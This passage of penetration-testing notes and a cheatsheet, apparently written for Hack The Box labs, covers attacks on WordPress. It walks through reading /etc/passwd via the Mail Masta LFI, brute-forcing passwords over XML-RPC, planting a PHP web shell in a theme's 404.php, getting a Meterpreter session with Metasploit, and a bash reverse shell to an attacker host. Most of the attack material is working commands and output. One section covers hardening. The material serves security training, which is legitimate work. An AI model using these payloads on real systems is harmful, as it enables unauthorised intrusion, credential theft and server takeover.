An attacker can interact with the vulnerable endpoint directly through a web browser to extract the `/etc/passwd` file. Prepending `view-source:` to the URL ensures the output is rendered cleanly as plain text, preventing the browser from attempting to interpret any potential HTML execution interference.

**Payload URL:**
`view-source:http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

### 3.2. Validating LFI via Command Line Interface (cURL)
For automation and terminal-based workflows, `curl` can be utilized to execute the HTTP GET request and retrieve the system file contents directly into the standard output.

**Execution:**
```bash
curl "[http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd](http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd)"
```

**Output Validation:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

## 4. Conclusion
The successful extraction of the `/etc/passwd` file explicitly confirms the presence of a critical LFI vulnerability within the `Mail Masta 1.0` plugin. This validates the initial data generated by the `wpscan` enumeration phase and provides a solid foothold for further exploitation, such as Log Poisoning, to potentially achieve Remote Code Execution (RCE).

# Attacking WordPress Users: Credential Bruteforcing

## Overview
During the enumeration phase of a WordPress audit, identifying valid usernames allows for targeted credential brute-force attacks. **WPScan** is a highly effective utility for this purpose, offering automated capabilities to test password lists against enumerated users. The tool primarily utilizes two authentication brute-force methods: `wp-login` and `xmlrpc`.

## Brute-Force Attack Vectors

1. **WP-Login Method (`wp-login`):**
   This method targets the standard WordPress login page (`/wp-login.php`). It submits credentials via standard HTTP POST requests. While effective, it is significantly slower, generates substantial web server traffic, and is easily flagged or blocked by basic Web Application Firewalls (WAFs) or intrusion prevention mechanisms like Fail2ban.

2. **XML-RPC Method (`xmlrpc`) - *Preferred*:**
   This method leverages the WordPress API endpoint (`/xmlrpc.php`). It is widely preferred in penetration testing due to its speed and stealth. XML-RPC allows attackers to bundle hundreds of password guesses into a single HTTP request using the `system.multicall` function. This drastically reduces the network overhead and bypasses many rate-limiting security controls that only monitor the standard login page.

## Practical Execution: WPScan XMLRPC Bruteforce

Once valid usernames are identified (e.g., `admin`, `david`, `roger`), you can initiate an XML-RPC password attack using a custom wordlist.

### Command Syntax

$ wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com

**Parameters Explained:**
* `--password-attack xmlrpc`: Specifies the use of the `/xmlrpc.php` endpoint for the attack.
* `-t 20`: Sets the number of concurrent threads to 20 to optimize the attack speed.
* `-U admin,david`: Defines the target usernames (comma-separated, no spaces).
* `-P passwords.txt`: Specifies the path to the password wordlist.
* `--url`: Defines the target WordPress URL.

### Expected Output

MikyRedHat@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                 
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                                                                                                         
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1

## Security Implications & Remediation
From a Systems Administration and Security standpoint, exposing the `xmlrpc.php` file represents a significant risk if not actively utilized by external applications (like Jetpack). To mitigate this brute-force vector:

1. **Disable XML-RPC:** If not required, block access to `xmlrpc.php` at the Web Server level (Nginx/Apache) or via the `.htaccess` file.
2. **Implement Rate Limiting:** Deploy Fail2ban to monitor and block IPs generating excessive failed login attempts.
3. **Enforce MFA:** Require Multi-Factor Authentication for all administrative accounts to neutralize compromised credentials.

# Post-Exploitation: Remote Code Execution (RCE) via WordPress Theme Editor

## Overview
When administrative access to the WordPress backend is compromised, auditors and penetration testers can leverage the built-in Theme Editor feature to modify PHP source files. By injecting malicious PHP functions (such as a web shell) into these files, it is possible to achieve Remote Code Execution (RCE) and run arbitrary system commands on the underlying web server.

## Execution Methodology

### 1. Accessing the Theme Editor
1. Authenticate to the WordPress administrator dashboard using valid high-privileged credentials.
2. Navigate to the left-hand sidebar and select **Appearance** > **Theme Editor**.
3. This interface provides direct write access to the PHP source code of the installed themes, assuming the web server has the appropriate file permissions.

### 2. Selecting a Target Theme
To maintain stealth, ensure service continuity, and avoid corrupting the active production theme (e.g., `Transportex`), it is best practice to target an inactive or default theme (e.g., `Twenty Seventeen`).
- Locate the **Select theme to edit** dropdown menu on the top right.
- Choose an unused theme and click **Select**.

### 3. Payload Injection (Web Shell)
Select a non-critical PHP template file that can be easily accessed directly via a web browser. The `404.php` (Error 404 template) is an excellent candidate for this purpose.

Insert the following PHP payload at the very beginning of the file, immediately after the opening `<?php` tag, to deploy a basic web shell:

    <?php
    system($_GET['cmd']);
    
    /**
     * The template for displaying 404 pages (not found)
     *
     * @link [https://codex.wordpress.org/Creating_an_Error_404_Page](https://codex.wordpress.org/Creating_an_Error_404_Page)
    <SNIP>

**Technical Breakdown:**
- The `system()` function in PHP executes the provided string as an operating system command and outputs the result.
- By passing `$_GET['cmd']`, the script will dynamically parse the `cmd` parameter from the HTTP GET request URL and execute its value at the system level.

## Verification and Execution
Once the modified `404.php` file is saved, RCE can be validated by passing operating system commands to the newly injected `cmd` parameter. 

The syntax for the HTTP GET request will follow this structure:
`http://<target>/wp-content/themes/<theme_name>/404.php?cmd=<command>`

### Example: Executing Commands via cURL
To verify command execution (e.g., retrieving the current user context with the `id` command), issue the following `curl` request from your terminal:

    curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

**Expected Output:**
If the injection is successful, the server will return the output of the executed command before rendering the rest of the 404 page:

    uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)

# Automating WordPress Exploitation via Metasploit Framework (MSF)

## Overview
We can leverage the Metasploit Framework (MSF) to automate the exploitation of a WordPress instance and establish a reverse shell. This technique requires valid credentials for an account with sufficient privileges to upload and execute files on the target web server (e.g., an Administrator role).

## 1. Initializing the Metasploit Framework
To begin the exploitation process, launch the MSF console from your terminal:

    msfconsole

## 2. Module Identification and Selection
For this scenario, we will utilize the wp_admin_shell_upload module. You can search for the specific module within MSF to verify its availability, path, and reliability rank:

    msf5 > search wp_admin

*Search Output:*

    Matching Modules
    ================

    #  Name                                       Disclosure Date  Rank       Check  Description
    -  ----                                       ---------------  ----       -----  -----------
    0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


To streamline the workflow, select the module using its assigned index ID from the search results rather than typing the full path:

    msf5 > use 0

## 3. Payload Configuration
Every module requires precise parameter configuration to ensure successful execution. Review the available and required settings:

    msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Assign the appropriate values for the target host (RHOSTS), local listener (LHOST), and the compromised WordPress credentials:

    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS blog.inlanefreight.com
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD Winter2020
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.16.8

## 4. Exploitation and Shell Access
Once the parameters are properly defined, execute the module. MSF will authenticate with the provided credentials, upload a malicious PHP payload disguised as a plugin, execute it to spawn a Meterpreter session, and subsequently delete the uploaded file to maintain stealth and avoid leaving artifacts on the target system.

    msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

*Expected Execution Output:*

    [*] Started reverse TCP handler on 10.10.16.8:4444
    [*] Authenticating with WordPress using admin:Winter2020...
    [+] Authenticated with WordPress
    [*] Uploading payload...
    [*] Executing the payload at /wp-content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
    [*] Sending stage (38247 bytes) to blog.inlanefreight.com
    [*] Meterpreter session 1 opened
    [+] Deleted uTvAAKrAdp.php

Finally, verify the session privileges by checking the current user context on the compromised server:

    meterpreter > getuid
    Server username: www-data (33)

# WordPress Hardening & Security Best Practices

## 1. Patch Management and Regular Updates
Continuous patching is a fundamental principle in maintaining the security posture of any web application. Vulnerabilities in WordPress core, plugins, and third-party themes are prime vectors for exploitation.

* **Automated Updates:** Enable automatic updates to ensure the rapid deployment of security patches. You can configure this programmatically by appending the following directives to your `wp-config.php` file:

    // Enable automatic updates for WordPress Core
    define( 'WP_AUTO_UPDATE_CORE', true );

    // Enable automatic updates for installed plugins
    add_filter( 'auto_update_plugin', '__return_true' );

    // Enable automatic updates for installed themes
    add_filter( 'auto_update_theme', '__return_true' );

## 2. Asset Management (Plugins & Themes)
Reducing the overall attack surface requires stringent oversight of all third-party components and supply chain dependencies.

* **Trusted Repositories:** Exclusively install assets from the official WordPress.org repository or verified, reputable developers.
* **Vulnerability Assessment:** Prior to installation, evaluate the asset's update frequency, active installation count, and community reviews. Abandoned or unmaintained plugins are critical security liabilities.
* **Attack Surface Reduction:** Routinely audit installed components. Completely uninstall and delete any deactivated or unused themes and plugins to prevent the exploitation of dormant, unpatched code.

## 3. Web Application Firewalls (WAF) & Security Suites
Deploying specialized security plugins significantly hardens the application layer by providing WAF capabilities, malware scanning, and continuous monitoring.

* **Sucuri Security:** A comprehensive security suite featuring Security Activity Auditing, File Integrity Monitoring (FIM), Remote Malware Scanning, and Blacklist Monitoring to detect indicators of compromise (IOCs).
* **iThemes Security:** Offers over 30 hardening configurations, including Two-Factor Authentication (2FA), cryptographic salt and security key management, Google reCAPTCHA integration, and detailed User Action Logging.
* **Wordfence Security:** Features a robust endpoint WAF and malware scanner. It identifies and blocks malicious traffic dynamically. Premium tiers offer real-time IP blacklisting and updated malware signatures to block requests from known malicious infrastructure.

## 4. Identity and Access Management (IAM)
Adversaries frequently target user credentials via brute-force and credential stuffing attacks. Securing the human element is paramount.

* **Administrative Accounts:** Disable or delete the default `admin` account. Provision administrative accounts with non-standard, unpredictable usernames.
* **Authentication Policies:** Enforce stringent password complexity requirements and mandate Two-Factor Authentication (2FA) across all administrative and privileged accounts.
* **Principle of Least Privilege (PoLP):** Restrict user permissions strictly to the minimum access level required for their specific role.
* **Access Reviews:** Conduct periodic audits of user privileges. Immediately revoke access or terminate accounts that are no longer active or required.

## 5. Configuration and Deployment Hardening
Modifying default configurations mitigates automated scanning and exploitation frameworks used by threat actors.

* **Prevent User Enumeration:** Deploy mechanisms (via custom code or plugins) to block author enumeration scans, thereby neutralizing a critical reconnaissance step used in password spraying attacks.
* **Rate Limiting:** Implement strict login attempt limits to thwart brute-force and dictionary attacks.
* **Obfuscate Authentication Portals:** Rename the default `wp-login.php` portal or restrict its access at the server level (e.g., using `.htaccess` or Nginx access controls) to authorized IP addresses only.

# WordPress Hacking & Pentesting Cheatsheet

A comprehensive operational guide and procedural roadmap detailing authorized penetration testing workflows for WordPress environments. This reference outlines the complete methodology from initial reconnaissance and aggressive enumeration to vulnerability research, exploitation, and post-exploitation, specifically tailored for HTB labs and CTF environments.

## 1. Practical Assessment Roadmap

### Assessment Flow
`Target Reconnaissance` → `Virtual Host Discovery` → `WordPress Fingerprinting` → `Directory & Component Enumeration` → `Vulnerability Research (CVE/SearchSploit)` → `Exploitation (LFI/Download/XML-RPC)` → `Authenticated Access` → `Theme Editor RCE` → `System Enumeration & Evidence Retrieval`

### Execution Phases
- **Phase 1: Target Recon** - Execute Nmap scans to identify open web ports (80/443), web server software, and service versions.
- **Phase 2: Virtual Host Discovery** - Inspect HTTP responses for domain names and append them to `/etc/hosts` for proper DNS resolution.
- **Phase 3: WP Fingerprinting** - Parse HTML source code (`generator` meta tags, `?ver=` parameters) to identify WordPress core versions and active themes.
- **Phase 4: Directory Enumeration** - Utilize FFUF to brute-force hidden paths, applying size filters (`-fs`) to eliminate soft-404 false positives.
- **Phase 5: Directory Listing** - Check standard directories (e.g., `/wp-content/uploads/`) for misconfigured Apache "Index of" exposures.
- **Phase 6: User Enumeration** - Leverage WPScan or author ID iteration (`/?author=1`) to harvest valid display names and privileged accounts.
- **Phase 7: Plugin Enumeration** - Extract plugin paths from source code and query their `readme.txt` files to parse exact version numbers.
- **Phase 8: Vulnerability Research** - Cross-reference identified components and versions using `searchsploit` to locate viable PoCs (Proof of Concepts). Do not assume outdated means exploitable; verify affected ranges.
- **Phase 9: Unauthenticated File Download** - Exploit vulnerable plugin endpoints to download sensitive server files without valid credentials.
- **Phase 10: Local File Inclusion (LFI)** - Inject payload paths (e.g., `/etc/passwd`) into vulnerable parameters to read unauthorized local system files.
- **Phase 11: XML-RPC Validation** - Ping `xmlrpc.php` to verify availability (expecting a `405 Method Not Allowed / Allow: POST` response) and test authentication via `wp.getUsersBlogs`.
- **Phase 12: Password Fuzzing** - Determine the baseline byte size of an invalid XML-RPC login attempt, then fuzz the password field using FFUF filtering out the invalid response size.
- **Phase 13: Authenticated Access** - Access the `/wp-admin/` dashboard utilizing compromised credentials to assess granted privileges.
- **Phase 14: Theme Editor RCE** - Inject a minimal PHP web shell into an inactive theme's `404.php` file via the Appearance editor to bypass active theme safety checks.
- **Phase 15: RCE Validation** - Trigger the modified `404.php` endpoint via cURL, executing commands like `id` and `whoami` to confirm `www-data` context execution.
- **Phase 16: Host Enumeration** - Leverage the web shell to list directories (`ls -la /home`), escalate privileges, or read required final evidence flags without necessarily dropping a full reverse shell.

## 2. Nmap - Initial Reconnaissance

- `nmap -Pn -sC -sV -p 80,443 <TARGET_IP>` - Executes a targeted port scan assuming the host is alive (`-Pn`), utilizing default NSE scripts (`-sC`) and service version detection (`-sV`).
- `nmap -Pn -p- <TARGET_IP>` - Performs an exhaustive scan across all 65,535 TCP ports to discover non-standard services.
- `sudo nmap -sS <TARGET_IP>` - Initiates a stealthy SYN "Half-open" scan, requiring root privileges.
- `nmap -sT <TARGET_IP>` - Performs a standard TCP Connect scan, completing the full three-way handshake (louder, no root required).
- `nmap --top-ports 100 <TARGET_IP>` - Scans the 100 most common TCP ports for rapid reconnaissance.

## 3. cURL - HTTP Enumeration & Requests

- `curl -sIL http://<HOST>/` - Performs a silent (`-s`) HTTP request, fetching only headers (`-I`) and automatically following redirects (`-L`).
- `curl -k https://<HOST>/` - Bypasses TLS/SSL certificate validation for endpoints with self-signed or invalid certificates.
- `curl -H "Host: blog.example.local" http://<TARGET_IP>/` - Injects a custom Host header to bypass proxy routing or test virtual host configurations without modifying local DNS.
- `curl --resolve blog.example.local:80:<TARGET_IP> http://blog.example.local/` - Forces cURL to resolve a specific hostname to a target IP, bypassing system DNS.
- `curl -d "username=user&password=pass" http://<HOST>/` - Transmits a standard HTTP POST request with URL-encoded form data.
- `curl -s -o /dev/null -w "%{http_code}\n" http://<HOST>/resource` - Suppresses standard output and returns only the HTTP status code of the endpoint.
- `curl -sG --data-urlencode "cmd=id" "http://<HOST>/shell.php"` - Submits a GET request (`-G`) while automatically URL-encoding the payload parameters.

## 4. Linux DNS Mapping

- `echo "<TARGET_IP> blog.example.local" | sudo tee -a /etc/hosts` - Appends a local DNS mapping to the `/etc/hosts` file for virtual host resolution.
- `getent hosts blog.example.local` - Verifies that the system correctly resolves the newly added hostname.
- `sudo sed -i '/blog\.example\.local/d' /etc/hosts` - Programmatically removes the old DNS entry to prevent routing conflicts when IP assignments change.

## 5. WordPress Footprinting & Detection

- `curl -s http://<HOST>/ | grep -Ei 'wp-content|wp-includes|wordpress'` - Parses the landing page source code to confirm the presence of WordPress architecture.
- `curl -s http://<HOST>/ | grep -i 'meta name="generator"'` - Extracts the generator meta tag, which often leaks the exact WordPress core version.
- `curl -s http://<HOST>/readme.html` - Accesses the default WordPress installation readme file, which may disclose versioning information.

## 6. Theme & Plugin Enumeration

- `curl -s http://<HOST>/ | grep -oE 'wp-content/themes/[^/"?]+/' | sort -u` - Extracts and deduplicates active theme directory paths from the HTML source.
- `curl -s http://<HOST>/wp-content/themes/<THEME>/style.css | head -n 40` - Retrieves the theme's CSS stylesheet headers to extract versioning and author metadata.
- `curl -s http://<HOST>/ | grep -oE 'wp-content/plugins/[^/"?]+/' | sort -u` - Extracts and deduplicates installed plugin paths from the HTML source.
- `curl -s http://<HOST>/wp-content/plugins/<PLUGIN>/readme.txt | grep -Ei '^(Stable tag|Version|Requires at least|Tested up to):'` - Parses the plugin's `readme.txt` to identify exact versions, crucial for mapping to known CVEs.

## 7. Directory Fuzzing & Listing

- `ffuf -u http://<HOST>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,204,301,302,307,401,403` - Executes directory brute-forcing, explicitly defining which HTTP status codes indicate a valid match.
- `ffuf -u http://<HOST>/FUZZ -w <WORDLIST> -fs <FALSE_RESPONSE_SIZE>` - Filters out soft-404 responses by instructing FFUF to ignore results matching a specific byte size.
- `curl -s http://<HOST>/<DIRECTORY>/ | grep -i "Index of"` - Detects misconfigured Apache web servers allowing unauthorized directory traversal and file listing.
- `curl -s http://<HOST>/<DIRECTORY>/ | html2text` - Renders directory listing HTML output into clean, terminal-readable plain text.

## 8. User Enumeration

- `curl -sI "http://<HOST>/?author=1"` - Leverages the default WordPress author routing behavior to leak usernames via HTTP `Location` headers.
- `curl -s http://<HOST>/wp-json/wp/v2/users | jq` - Queries the exposed WordPress REST API for user endpoints, formatting the JSON output for readability.

## 9. WPScan Usage

- `wpscan --url http://<HOST> --enumerate u` - Enumerates WordPress users to identify valid account names for brute-force or targeted attacks.
- `wpscan --url http://<HOST> --enumerate ap --plugins-detection aggressive` - Actively probes for all plugins, bypassing passive detection methods to uncover hidden components.
- `wpscan --url http://<HOST> --enumerate vt` - Specifically enumerates the target for known vulnerable themes.

## 10. Exploit Research (SearchSploit)

- `searchsploit "WordPress <PLUGIN> <VERSION>"` - Queries the local Exploit-DB repository for specific component vulnerabilities.
- `searchsploit -x php/webapps/<EXPLOIT>.txt` - Opens the selected exploit Proof of Concept (PoC) in the terminal pager for code review.
- `searchsploit "WordPress <PLUGIN>" | grep -Ei 'LFI|local file|file download|arbitrary file|file read|traversal|SQL|RCE'` - Filters SearchSploit output to isolate high-impact vulnerabilities.

## 11. Local File Inclusion (LFI) & File Download

- `curl -s "http://<HOST>/<VULNERABLE_ENDPOINT>?<PARAMETER>=/etc/passwd" | grep '^f'` - Exploits an LFI vulnerability to read the `/etc/passwd` file, filtering the output to display valid local user accounts.
- `curl -s "http://<HOST>/wp-admin/admin.php?page=download_report&report=users&status=all"` - Example pattern of exploiting an unauthenticated file download vulnerability to exfiltrate sensitive backend reports.

## 12. XML-RPC Enumeration & Attack

- `curl -i http://<HOST>/xmlrpc.php` - Checks the availability of the XML-RPC interface. A `405 Method Not Allowed` implies the endpoint is active and awaiting POST requests.
- `wpscan --url http://<HOST> -U <USER> -P <WORDLIST> --password-attack xmlrpc -t 50` - Executes a multithreaded credential brute-force attack leveraging the XML-RPC API.
- `ffuf -u http://<HOST>/xmlrpc.php -w /tmp/rockyou.txt -X POST -H "Content-Type: text/xml" -d '<XML_PAYLOAD>' -fs <INVALID_SIZE>` - Uses FFUF to brute-force the XML-RPC endpoint by injecting payloads directly into the POST body and filtering out standard rejection responses.

## 13. Theme Editor RCE & Web Shells

- `curl -s "http://<HOST>/wp-content/themes/<INACTIVE_THEME>/404.php?cmd=whoami"` - Triggers a manually injected PHP web shell located within an inactive theme, achieving Remote Code Execution (RCE) without disrupting the live site architecture.
- `curl -sG --data-urlencode "cmd=ls -la /home" "http://<HOST>/wp-content/themes/<INACTIVE_THEME>/404.php"` - Enumerates the underlying file system dynamically passing OS commands through the web shell.

## 14. Reverse Shell & Post-Exploitation

- `nc -lvnp 4444` - Initializes a Netcat listener on the attacker machine to catch inbound reverse shell connections without DNS resolution (`-n`).
- `curl -sG --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'" "http://<HOST>/wp-content/themes/<THEME>/404.php"` - Executes a Bash reverse shell payload via the web shell, tunneling standard output and errors back to the listening attacker machine.
- `ss -tulpn` - Post-exploitation command to audit listening ports and active socket connections on the compromised host.
- `ip a` - Post-exploitation command to map internal network interfaces and routing configurations.

## 15. Quick References

### HTTP Status Codes
- `200` - OK (Request successful)
- `301 / 302` - Permanent / Temporary Redirect
- `401 / 403` - Authentication Required / Forbidden (Access denied)
- `404 / 405` - Not Found / Method Not Allowed
- `500` - Internal Server Error

### Essential CLI Filters
- `grep -Ei 'wordpress|plugin|theme'` - Case-insensitive extended regular expression search.
- `grep '^f'` - Matches only lines beginning with the character 'f'.
- `sort -u` - Sorts output alphabetically and purges duplicate entries.
- `jq` - Parses and formats JSON structured data.
- `html2text` - Renders HTML web layouts into readable CLI text format.

### Target Terminology
- **Directory Fuzzing:** Automated discovery of unlinked routes and hidden paths.
- **Directory Listing:** Server misconfiguration exposing the contents of a directory.
- **LFI (Local File Inclusion):** Vulnerability allowing attackers to read local server files.
- **Unauthenticated File Download:** Bypassing access controls to retrieve protected files.
- **RCE (Remote Code Execution):** Ability to execute arbitrary operating-system level commands.
- **Web Shell:** A malicious script uploaded to maintain persistent HTTP-based command execution.
- **Reverse Shell:** A shell session initiated from the target system connecting back to the attacker's infrastructure.